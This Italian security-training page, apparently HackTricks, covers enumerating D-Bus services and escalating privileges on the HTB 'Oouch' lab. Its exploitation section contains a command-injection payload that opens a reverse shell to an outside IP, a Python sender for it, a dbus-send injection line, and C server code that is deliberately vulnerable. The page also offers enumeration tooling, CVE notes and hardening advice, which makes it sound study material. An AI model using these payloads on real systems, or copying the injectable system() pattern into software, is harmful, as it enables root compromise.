# Enumerazione D-Bus e privilege escalation tramite Command Injection

{{#include ../../banners/hacktricks-training.md}}

## **Enumerazione GUI**

D-Bus viene utilizzato come mediatore per la comunicazione inter-processo (IPC) negli ambienti desktop Ubuntu. Su Ubuntu si osserva il funzionamento simultaneo di diversi message bus: il system bus, utilizzato principalmente dai **servizi privilegiati per esporre servizi rilevanti per l'intero sistema**, e un session bus per ogni utente che ha effettuato l'accesso, che espone servizi rilevanti solo per quell'utente specifico. In questo caso ci si concentra soprattutto sul system bus, in quanto associato a servizi eseguiti con privilegi più elevati (ad es. root), dato che il nostro obiettivo è elevare i privilegi. L'architettura di D-Bus utilizza un «router» per ogni session bus, responsabile di reindirizzare i messaggi dei client ai servizi appropriati in base all'indirizzo specificato dai client per il servizio con cui desiderano comunicare.<sup>[[1]](#references)</sup>

I servizi su D-Bus sono definiti dagli **oggetti** e dalle **interfacce** che espongono. Gli oggetti sono paragonabili alle istanze di classe nei comuni linguaggi OOP, e ogni istanza è identificata in modo univoco da un **object path**. Questo percorso, simile a un percorso del filesystem, identifica in modo univoco ogni oggetto esposto dal servizio. Un'interfaccia importante per la ricerca è **org.freedesktop.DBus.Introspectable**, che presenta un unico metodo, Introspect. Questo metodo restituisce una rappresentazione XML dei metodi, segnali e proprietà supportati dall'oggetto; qui ci concentreremo sui metodi, tralasciando proprietà e segnali.

Per comunicare con l'interfaccia D-Bus sono stati utilizzati due strumenti: **gdbus**, uno strumento CLI che consente di richiamare facilmente, negli script, i metodi esposti da D-Bus, e [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), uno strumento GUI basato su Python progettato per enumerare i servizi disponibili su ciascun bus e visualizzare gli oggetti contenuti in ogni servizio.

```bash
sudo apt-get install d-feet
```

Se stai controllando il **session bus**, verifica prima l'indirizzo corrente:

```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

Nella prima immagine sono mostrati i servizi registrati con il bus di sistema D-Bus, con **org.debin.apt** evidenziato dopo aver selezionato il pulsante System Bus. D-Feet interroga questo servizio per ottenere gli oggetti, mostrando le interfacce, i metodi, le proprietà e i segnali degli oggetti selezionati, come si vede nella seconda immagine. È inoltre indicata la signature di ciascun metodo.

Una funzionalità degna di nota è la visualizzazione del **process ID (pid)** e della **riga di comando** del servizio, utile per verificare se viene eseguito con privilegi elevati, aspetto importante per la rilevanza della ricerca.

**D-Feet consente anche di invocare i metodi**: gli utenti possono inserire espressioni Python come parametri, che D-Feet converte in tipi D-Bus prima di passarle al servizio.

Tuttavia, alcuni metodi richiedono l'autenticazione prima di consentirne l'invocazione. Ignoreremo questi metodi, poiché il nostro obiettivo è elevare i privilegi senza credenziali.

Si noti inoltre che alcuni servizi chiedono a un altro servizio D-Bus, denominato org.freedeskto.PolicyKit1, se un utente deve poter eseguire determinate azioni.

## **Enumerazione da riga di comando**

### Elencare gli oggetti del servizio

È possibile elencare le interfacce D-Bus aperte con:

```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```

I servizi contrassegnati come **`(activatable)`** sono particolarmente interessanti perché **non sono ancora in esecuzione**, ma una richiesta sul bus può avviarli su richiesta. Non fermarti a `busctl list`: associa quei nomi ai binari che eseguirebbero.

```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```

Questo ti indica rapidamente quale percorso `Exec=` verrà avviato per un nome attivabile e con quale identità. Se il binario o la sua catena di esecuzione sono protetti in modo debole, un servizio inattivo può comunque diventare una via per l'escalation dei privilegi.

Per un servizio privilegiato di imaging USB, correla il nome sul bus di sistema con la policy **effettiva** per la sua azione di scrittura delle immagini. Una regola legacy del vendor potrebbe concedere a un gruppo Unix amministrativo `ResultActive=yes` senza richiedere una password; verifica che l'account corrente appartenga a quel gruppo, che la sessione sia attiva, che la regola sia effettivamente caricata e non sovrascritta e che l'helper installato accetti ancora percorsi di origine e destinazione scelti dal chiamante. Il descrittore del servizio o una vecchia versione del pacchetto, da soli, non dimostrano l'accesso arbitrario ai file. L'assenza di un descrittore di attivazione non esclude che il servizio sia già in esecuzione. Esamina i file fissi di policy e del servizio senza invocare il metodo di scrittura delle immagini; vedi l'[analisi originale del servizio](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/).

#### Connessioni

[Da Wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Quando un processo stabilisce una connessione a un bus, il bus assegna alla connessione un nome bus speciale, chiamato _nome di connessione univoco_. I nomi bus di questo tipo sono immutabili: è garantito che non cambino finché la connessione esiste e, cosa ancora più importante, non possono essere riutilizzati per tutta la durata del bus. Ciò significa che a nessun'altra connessione a quel bus verrà mai assegnato un nome di connessione univoco del genere, anche se lo stesso processo chiude la connessione al bus e ne crea una nuova. I nomi di connessione univoci sono facilmente riconoscibili perché iniziano con il carattere dei due punti, altrimenti vietato.<sup>[[4]](#references)</sup>

### Informazioni sull'oggetto del servizio

Poi, puoi ottenere alcune informazioni sull'interfaccia con:

```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
```

Correla inoltre il nome del bus con la relativa unità `systemd` e il percorso dell'eseguibile:

```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```

Questo risponde alla domanda operativa importante durante la privesc: **se una chiamata al metodo va a buon fine, quale binario e unit reali eseguiranno l'azione?**

### Elencare le interfacce di un oggetto di servizio

Sono necessari permessi sufficienti.

```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
  └─/htb/oouch
    └─/htb/oouch/Block
```

### Esaminare l'interfaccia di un oggetto servizio

Nota che in questo esempio è stata selezionata l'interfaccia più recente individuata usando il parametro `tree` (_vedi sezione precedente_):

```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```

Nota il metodo `.Block` dell’interfaccia `htb.oouch.Block` (quello che ci interessa). La "s" nelle altre colonne potrebbe indicare che si aspetta una stringa.

Prima di provare qualcosa di pericoloso, verifica un metodo **orientato alla lettura** o comunque a basso rischio. In questo modo distingui chiaramente tre casi: sintassi errata, metodo raggiungibile ma negato, oppure raggiungibile e consentito.

```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```

### Correlare i metodi D-Bus con le policy e le azioni

L’introspezione ti dice **cosa** puoi chiamare, ma non ti dice **perché** una chiamata è consentita o negata. Per una vera analisi di privesc, di solito devi esaminare insieme **tre livelli**:

1. **Metadati di attivazione** (file `.service` o `SystemdService=`) per scoprire quale binario e quale unità verranno effettivamente eseguiti.
2. **Policy XML di D-Bus** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) per scoprire chi può usare `own`, `send_destination` o `receive_sender`.
3. **File delle azioni Polkit** (`/usr/share/polkit-1/actions/*.policy`) per scoprire il modello di autorizzazione predefinito (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Comandi utili:

```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```

Do **not** assumere una corrispondenza 1:1 tra un metodo D-Bus e un'azione Polkit. Lo stesso metodo può scegliere un'azione diversa a seconda dell'oggetto modificato o del contesto di runtime. Pertanto, il flusso di lavoro pratico è:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` e grep dei file `.policy` pertinenti
3. probe live a basso rischio con `busctl call`, `gdbus call` o `dbusmap --enable-probes --null-agent`

I servizi proxy o di compatibilità meritano particolare attenzione. Un **proxy in esecuzione come root** che inoltra richieste a un altro servizio D-Bus tramite una propria connessione già stabilita può far sì, involontariamente, che il backend consideri ogni richiesta come proveniente dall'UID 0, a meno che l'identità del chiamante originale non venga convalidata nuovamente.<sup>[[3]](#references)</sup>

### Interfaccia di monitoraggio/acquisizione

Con privilegi sufficienti (i soli privilegi `send_destination` e `receive_sender` non bastano) puoi **monitorare una comunicazione D-Bus**.

Per **monitorare** una **comunicazione** devi essere **root**. Se riscontri ancora problemi anche con privilegi root, consulta [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) e [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Se sai come configurare un file di configurazione D-Bus per **consentire agli utenti non root di intercettare** la comunicazione, **contattami**!

Diversi modi per monitorare:

```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```

Nell'esempio seguente, l'interfaccia `htb.oouch.Block` viene monitorata e **il messaggio "**_**lalalalal**_**" viene inviato tramite miscommunication**:

```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
  Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
  UniqueName=:1.1376
  MESSAGE "s" {
          STRING "lalalalal";
  };

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
  Sender=:1.3  Destination=:1.1376
  UniqueName=:1.3
  MESSAGE "s" {
          STRING "Carried out :D";
  };
```

Puoi usare `capture` al posto di `monitor` per salvare i risultati in un file **pcapng** che Wireshark può aprire:

```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```

#### Filtrare tutto il rumore <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Se sul bus c'è davvero troppa informazione, passa una regola di corrispondenza come questa:

```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```

È possibile specificare più regole. Se un messaggio corrisponde _a una qualsiasi_ delle regole, il messaggio verrà stampato. Ad esempio:

```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```

Per ulteriori informazioni sulla sintassi delle regole di corrispondenza, consulta la [documentazione di D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html).<sup>[[7]](#references)</sup>

### Altro

`busctl` ha ancora più opzioni, [**le trovi tutte qui**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Scenario vulnerabile**

Come utente **qtc all'interno dell'host "oouch" di HTB**, puoi trovare un **file di configurazione D-Bus inaspettato** situato in _/etc/dbus-1/system.d/htb.oouch.Block.conf_:

```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

    <policy user="root">
        <allow own="htb.oouch.Block"/>
    </policy>

	<policy user="www-data">
		<allow send_destination="htb.oouch.Block"/>
		<allow receive_sender="htb.oouch.Block"/>
	</policy>

</busconfig>
```

Dalla configurazione precedente, nota che **dovrai essere l’utente `root` o `www-data` per inviare e ricevere informazioni** tramite questa comunicazione D-BUS.

Come utente **qtc** all’interno del container Docker **aeb4525789d8**, puoi trovare del codice relativo a dbus nel file _/code/oouch/routes.py._ Ecco il codice interessante:

```python
if primitive_xss.search(form.textfield.data):
        bus = dbus.SystemBus()
        block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
        block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

        client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
        response = block_iface.Block(client_ip)
        bus.close()
        return render_template('hacker.html', title='Hacker')
```

Come puoi vedere, si sta **connettendo a un'interfaccia D-Bus** e invia alla funzione **"Block"** il valore "client_ip".

All'altro capo della connessione D-Bus è in esecuzione un binario C compilato. Questo codice è in **ascolto** sulla connessione D-Bus **in attesa di un indirizzo IP e chiama iptables tramite la funzione `system`** per bloccare l'indirizzo IP specificato.\
**La chiamata a `system` è intenzionalmente vulnerabile alla command injection**, quindi un payload come il seguente aprirà una reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Sfruttalo

Alla fine di questa pagina trovi il **codice C completo dell'applicazione D-Bus**. Tra le righe 91-97 puoi vedere **come vengono registrati il `D-Bus object path`** e il **`interface name`**. Queste informazioni saranno necessarie per inviare dati alla connessione D-Bus:

```c
        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
```

Inoltre, alla riga 57 puoi vedere che **l’unico metodo registrato** per questa comunicazione D-Bus si chiama `Block`(_**Per questo, nella sezione seguente, i payload verranno inviati all’oggetto di servizio `htb.oouch.Block`, all’interfaccia `/htb/oouch/Block` e al metodo `Block`**_):

```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```

#### Python

Il seguente codice Python invierà il payload alla connessione D-Bus tramite il metodo `Block` con `block_iface.Block(runme)` (_nota che è stato estratto dal frammento di codice precedente_):

```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```

#### busctl and dbus-send

```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```

- `dbus-send` è uno strumento usato per inviare messaggi al “Message Bus”
- Message Bus – Software usato dai sistemi per facilitare la comunicazione tra le applicazioni. È correlato a Message Queue (i messaggi vengono ordinati in sequenza), ma nel Message Bus i messaggi vengono inviati secondo un modello subscription e molto rapidamente.
- Il tag “-system” indica che si tratta di un messaggio di sistema, non di sessione (impostazione predefinita).
- Il tag “–print-reply” serve a stampare correttamente il nostro messaggio e a ricevere eventuali risposte in un formato leggibile.
- “–dest=Dbus-Interface-Block” è l’indirizzo dell’interfaccia Dbus.
- “–string:” – Tipo di messaggio che vogliamo inviare all’interfaccia. Esistono diversi formati per inviare messaggi, come double, bytes, booleans, int e objpath. Tra questi, “object path” è utile quando vogliamo inviare il percorso di un file all’interfaccia Dbus. In questo caso possiamo usare un file speciale (FIFO) per passare un comando all’interfaccia usando il nome di un file. “string:;” – Serve a richiamare nuovamente l’object path, dove inseriamo il file/comando FIFO reverse shell.

_Nota che in `htb.oouch.Block.Block`, la prima parte (`htb.oouch.Block`) fa riferimento all’oggetto servizio, mentre l’ultima parte (`.Block`) fa riferimento al nome del metodo._

### Codice C

```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
        char* host = NULL;
        int r;

        /* Read the parameters */
        r = sd_bus_message_read(m, "s", &host);
        if (r < 0) {
                fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
                return r;
        }

        char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

        int command_len = strlen(command);
        int host_len = strlen(host);

        char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
        if(command_buffer == NULL) {
                fprintf(stderr, "Failed to allocate memory\n");
                return -1;
        }

        sprintf(command_buffer, command, host);

        /* In the first implementation, we simply ran command using system(), since the expected DBus
         * to be threading automatically. However, DBus does not thread and the application will hang
         * forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
         * multithreading)
         */
        int pid = fork();

        if ( pid == 0 ) {
            /* Here we are in the child process. We execute the command and eventually exit. */
            system(command_buffer);
            exit(0);
        } else {
            /* Here we are in the parent process or an error occured. We simply send a genric message.
             * In the first implementation we returned separate error messages for success or failure.
             * However, now we cannot wait for results of the system call. Therefore we simply return
             * a generic. */
            return sd_bus_reply_method_return(m, "s", "Carried out :D");
        }
        r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
        SD_BUS_VTABLE_START(0),
        SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
        SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
        /*
         * Main method, registeres the htb.oouch.Block service on the system dbus.
         *
         * Paramaters:
         *      argc            (int)             Number of arguments, not required
         *      argv[]          (char**)          Argument array, not required
         *
         * Returns:
         *      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
         *      as long as the user keeps it alive.
         */


        /* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
        signal(SIGCHLD,SIG_IGN);

        sd_bus_slot *slot = NULL;
        sd_bus *bus = NULL;
        int r;

        /* First we need to connect to the system bus. */
        r = sd_bus_open_system(&bus);
        if (r < 0)
        {
                fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
                goto finish;
        }

        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
        if (r < 0) {
                fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
                goto finish;
        }

        /* Register the service name to find out object */
        r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
        if (r < 0) {
                fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
                goto finish;
        }

        /* Infinite loop to process the client requests */
        for (;;) {
                /* Process requests */
                r = sd_bus_process(bus, NULL);
                if (r < 0) {
                        fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
                        goto finish;
                }
                if (r > 0) /* we processed a request, try to process another one, right-away */
                        continue;

                /* Wait for the next request to process */
                r = sd_bus_wait(bus, (uint64_t) -1);
                if (r < 0) {
                        fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
                        goto finish;
                }
        }

finish:
        sd_bus_slot_unref(slot);
        sd_bus_unref(bus);

        return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```

## Helper per l'Enumeration automatizzata (2023-2025)

L'Enumeration manuale di una vasta attack surface D-Bus con `busctl`/`gdbus` diventa presto complicata. Due piccole utility FOSS rilasciate negli ultimi anni possono velocizzare le attività di red-team o CTF:

### dbusmap ("Nmap for D-Bus")
* Autore: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
* Scritto in C; singolo binario statico (<50 kB) che analizza ogni object path, recupera l'XML `Introspect` e lo associa al PID/UID proprietario.<sup>[[5]](#references)</sup>
* Flag utili:
  ```bash
  # List every service on the *system* bus and dump all callable methods
  sudo dbus-map --dump-methods

  # Actively probe methods/properties you can reach without Polkit prompts
  sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
  ```
* Lo strumento contrassegna con `!` i well-known name non protetti, rivelando subito i servizi di cui puoi *own* (prendere il controllo) o le chiamate di metodo raggiungibili da una shell non privilegiata.

### uptux.py
* Autore: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
* Script solo Python che cerca percorsi *scrivibili* nelle unità systemd **e** file di policy D-Bus eccessivamente permissivi (ad es. `send_destination="*"`).<sup>[[6]](#references)</sup>
* Uso rapido:
  ```bash
  python3 uptux.py -n          # run all checks but don’t write a log file
  python3 uptux.py -d          # enable verbose debug output
  ```
* Il modulo D-Bus cerca nelle directory seguenti e segnala qualsiasi servizio che un utente normale può contraffare o dirottare:
  * `/etc/dbus-1/system.d/` e `/usr/share/dbus-1/system.d/`
  * `/etc/dbus-1/system-local.d/` (override del vendor)

---

## Noti bug di privilege escalation D-Bus (2024-2025)

Tenere d'occhio le CVE pubblicate di recente aiuta a individuare pattern insicuri simili nel codice personalizzato. Due buoni esempi recenti sono:<sup>[[2]](#references)[[3]](#references)</sup>

| Anno | CVE | Componente | Causa principale | Lezione offensiva |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Il servizio in esecuzione come root esponeva un'interfaccia D-Bus che gli utenti non privilegiati potevano riconfigurare, anche caricando comportamenti macro controllati dall'attaccante. | Se un daemon espone la **gestione di dispositivi/profili/configurazioni** sul system bus, considera le funzionalità di configurazione scrivibile e macro primitive di esecuzione di codice, non semplici "impostazioni". |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Un proxy di compatibilità in esecuzione come root inoltrava richieste ai servizi backend senza preservare il contesto di sicurezza del chiamante originale, perciò i backend si fidavano del proxy come UID 0. | Considera i servizi D-Bus **proxy / bridge / di compatibilità** una classe di bug a sé: se inoltrano chiamate privilegiate, verifica come il contesto UID/Polkit del chiamante viene trasmesso al backend. |

Pattern da notare:
1. Il servizio viene eseguito **come root sul system bus**.
2. Non c'è **alcun controllo di autorizzazione**, oppure il controllo viene eseguito sul **soggetto sbagliato**.
3. Il metodo raggiungibile finisce per modificare lo stato del sistema: installazione di pacchetti, modifiche a utenti/gruppi, configurazione del bootloader, aggiornamenti dei profili dei dispositivi, scrittura di file o esecuzione diretta di comandi.

Usa `dbusmap --enable-probes` o `busctl call` manualmente per verificare se un metodo è raggiungibile, quindi esamina le policy XML del servizio e le azioni Polkit per capire **quale soggetto** viene effettivamente autorizzato.

---

## Interventi rapidi per hardening e rilevamento

* Cerca policy aperte alla scrittura da tutti o *send/receive*:
  ```bash
  grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
  ```
* Richiedi Polkit per i metodi pericolosi: anche i proxy *root* dovrebbero passare il PID del *caller* a `polkit_authority_check_authorization_sync()` invece del proprio.
* Riduci i privilegi degli helper a lunga esecuzione (usa `sd_pid_get_owner_uid()` per cambiare namespace dopo la connessione al bus).
* Se non puoi rimuovere un servizio, almeno *limitalo* a un gruppo Unix dedicato e restringi l'accesso nella sua policy XML.
* Blue-team: acquisisci il system bus con `busctl capture > /var/log/dbus_$(date +%F).pcapng` e importalo in Wireshark per rilevare anomalie.

---

## References

- [1] [Escalation dei privilegi tramite D-Bus di USBCreator in Ubuntu Desktop](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [2] [CVE-2024-45752: il servizio D-Bus consente a qualsiasi utente senza privilegi di modificare la configurazione](https://github.com/PixlOne/logiops/issues/473)
- [3] [dde-api-proxy: bypass dell'autenticazione nel servizio proxy D-Bus di Deepin (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
- [4] [D-Bus - Wikipedia](https://en.wikipedia.org/wiki/D-Bus)
- [5] [taviso/dbusmap - "Nmap per D-Bus"](https://github.com/taviso/dbusmap)
- [6] [initstring/uptux](https://github.com/initstring/uptux)
- [7] [dbus.freedesktop.org - documentazione D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html)
{{#include ../../banners/hacktricks-training.md}}
